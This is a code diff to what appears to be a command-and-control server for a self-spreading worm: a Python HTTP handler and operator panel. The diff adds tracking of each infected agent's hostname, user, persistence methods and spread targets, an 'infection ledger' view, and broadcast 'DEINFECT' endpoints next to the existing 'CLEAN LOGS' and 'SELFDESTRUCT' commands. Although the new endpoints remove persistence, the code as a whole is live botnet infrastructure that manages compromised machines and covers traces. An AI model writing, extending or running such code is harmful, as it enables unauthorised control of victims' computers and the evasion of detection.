@@ -583,7 +583,13 @@ a{{color:var(--acc);text-decoration:none}}
 </div></div>
 <div class="qa-sec"><div class="qa-lbl">Danger</div><div class="qa-row">
 <a class="qa r" onclick="Q('CLEAN')">CLEAN LOGS</a>
+<a class="qa r" onclick="if(confirm('DEINFECT this agent? Removes all persistence + self-deletes.'))Q('DEINFECT')">DEINFECT</a>
 <a class="qa r" onclick="if(confirm('Selfdestruct?'))Q('SELFDESTRUCT')">SELFDESTRUCT</a>
+</div></div>
+<div class="qa-sec"><div class="qa-lbl">Broadcast</div><div class="qa-row">
+<a class="qa r" href="/deinfect/all" onclick="return confirm('DEINFECT ALL agents? This removes all persistence on every registered host.')">DEINFECT ALL</a>
+<a class="qa r" href="/deinfect/worms" onclick="return confirm('DEINFECT all worm agents?')">DEINFECT WORMS</a>
+<a class="qa" href="/infection/ledger" target="_blank">INFECTION LEDGER</a>
 </div></div>
 </div>
 <div class="pane" id="p-out">
@@ -831,9 +837,20 @@ class H(BaseHTTPRequestHandler):
                 un     = unquote_plus(qs2.get("user",[""])[0])
                 atype  = qs2.get("type",["worm"])[0]
                 ts     = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                spread_raw  = unquote_plus(qs2.get("spread",[""])[0])
+                persist_raw = unquote_plus(qs2.get("persist",[""])[0])
+                spread_list  = [h for h in spread_raw.split(",")  if h]
+                persist_list = [m for m in persist_raw.split(",") if m]
                 with threading.Lock():
-                    agents[aid] = {"id":aid,"os":os_v,"hostname":hn,"user":un,"type":atype,"first_seen":ts,"last_seen":ts,"alive":True}
-                _log(f"[CDN-REG] {aid} os={os_v} host={hn} user={un}")
+                    existing = agents.get(aid, {})
+                    agents[aid] = {
+                        "id": aid, "os": os_v, "hostname": hn, "user": un,
+                        "type": atype, "first_seen": existing.get("first_seen", ts),
+                        "last_seen": ts, "alive": True,
+                        "persist_methods": persist_list,
+                        "spread_log": spread_list,
+                    }
+                _log(f"[CDN-REG] {aid} os={os_v} host={hn} user={un} persist={persist_list} spread={spread_list[:5]}")
                 resp = _comm_enc("OK", aid) if aid else "OK"
                 self._send(resp); return
 
@@ -916,6 +933,46 @@ class H(BaseHTTPRequestHandler):
             else:
                 self._redir("/panel")
             return
+
+        # ── Deinfect endpoints ─────────────────────────────────────────────────
+        if path == "/deinfect/all":
+            with _lock:
+                targets = list(agents.keys())
+                for a in targets: agent_cmds[a].append("DEINFECT")
+            log(f"[DEINFECT-ALL] queued DEINFECT for {len(targets)} agents")
+            self._json({"queued": targets, "count": len(targets)}); return
+
+        if path == "/deinfect/worms":
+            with _lock:
+                targets = [a for a in agents if agents[a].get("type","").startswith("worm")]
+                for a in targets: agent_cmds[a].append("DEINFECT")
+            log(f"[DEINFECT-WORMS] queued DEINFECT for {len(targets)} worm agents")
+            self._json({"queued": targets, "count": len(targets)}); return
+
+        if path.startswith("/deinfect/"):
+            aid = path.split("/")[-1]
+            if aid in agents:
+                agent_cmds[aid].append("DEINFECT")
+                log(f"[DEINFECT] queued for {aid}")
+                self._json({"queued": aid, "persist": agents[aid].get("persist_methods",[]),
+                            "spread": agents[aid].get("spread_log",[])}); return
+            self._json({"error": "agent not found"}, 404); return
+
+        if path == "/infection/ledger":
+            ledger = {}
+            with _lock:
+                for aid, a in agents.items():
+                    ledger[aid] = {
+                        "hostname": a.get("hostname","?"),
+                        "user": a.get("user","?"),
+                        "os": a.get("os","?"),
+                        "persist_methods": a.get("persist_methods",[]),
+                        "spread_log": a.get("spread_log",[]),
+                        "first_seen": a.get("first_seen","?"),
+                        "last_seen": a.get("last_seen","?"),
+                        "alive": a.get("alive", False),
+                    }
+            self._json(ledger); return
 
         # Agent delete
         if path=="/agent/delete":
@@ -1356,6 +1413,14 @@ h2{{color:#4af;margin-bottom:16px}}
 {rows}
 </body></html>"""
 
+    def _json(self, obj, code=200):
+        import json as _json
+        data = _json.dumps(obj, indent=2).encode()
+        self.send_response(code)
+        self.send_header("Content-Type", "application/json")
+        self.send_header("Content-Length", len(data))
+        self._cors(); self.end_headers()
+        self.wfile.write(data)
     def _html(self,body):
         data=body.encode() if isinstance(body,str) else body
         self.send_response(200); self.send_header("Content-Type","text/html; charset=utf-8")
